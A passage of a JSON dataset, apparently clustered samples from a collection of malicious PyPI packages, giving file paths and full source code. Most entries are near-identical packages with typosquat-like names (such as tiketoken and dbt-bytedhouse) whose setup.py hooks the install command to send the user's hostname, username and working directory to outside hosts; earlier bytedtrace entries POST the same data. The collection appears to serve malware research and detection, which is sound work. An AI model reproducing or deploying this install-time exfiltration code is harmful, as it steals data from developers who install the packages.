        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.1.12",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.1.13",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.1.14",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.10.1",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      }
    ]
  },
  {
    "cluster_id": 4,
    "size": 58,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-07-e3po-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"E3PO\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"E3PO\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-bytep-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"bytep\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"bytep\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-bytepilot-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"bytepilot\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"bytepilot\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-bytesp-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"bytesp\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"bytesp\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-dbt-bytedhouse-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"dbt-bytedhouse\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"dbt-bytedhouse\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-dbt-byteshouse-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"dbt-byteshouse\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"dbt-byteshouse\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-dtb-bytehouse-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"dtb-bytehouse\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"dtb-bytehouse\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-habitmf-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"HabitMF\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"HabitMF\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-laghtseq-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"laghtseq\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"laghtseq\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-lightsuq-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"lightsuq\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"lightsuq\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-macaqua-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"macaqua\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"macaqua\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-machaque-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"machaque\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"machaque\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-macque-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"macque\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"macque\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-nurset-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"Nurset\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"Nurset\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-tiketoken-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"tiketoken\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"tiketoken\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-tktoken-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"tktoken\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"tktoken\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-x2vmlgml-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"x2vmlgml\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"x2vmlgml\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-07-batchran-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"batchran\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"batchran\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-07-bytemlperf-v912.6",
